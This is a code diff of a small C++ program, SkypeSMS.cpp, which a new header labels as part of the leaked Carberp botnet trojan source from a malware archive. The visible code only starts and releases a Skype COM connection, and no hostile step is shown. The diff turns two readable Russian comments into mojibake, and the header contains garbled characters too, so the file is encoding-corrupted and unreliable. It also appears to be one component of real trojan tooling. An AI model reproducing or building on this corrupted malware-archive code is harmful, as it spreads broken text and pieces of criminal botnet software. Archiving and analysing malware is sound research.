@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // SkypeSMS.cpp : Defines the entry point for the console application.
 //
 
@@ -14,7 +25,7 @@ int _tmain(int argc, _TCHAR* argv[])
   }
   CoInitialize(NULL); 
   
-   // Создаем Skype объект 
+   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Skype пїЅпїЅпїЅпїЅпїЅпїЅ 
    SKYPE4COMLib::ISkypePtr pSkype(__uuidof(SKYPE4COMLib::Skype)); 
    if( !pSkype->Client->IsRunning )
    {
@@ -39,7 +50,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	   printf("1\n");
 	   printf(e.Description());
    }
-   // Удаляем соединения со скайп 
+   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
    pSkype = NULL; 
 
    CoUninitialize(); 
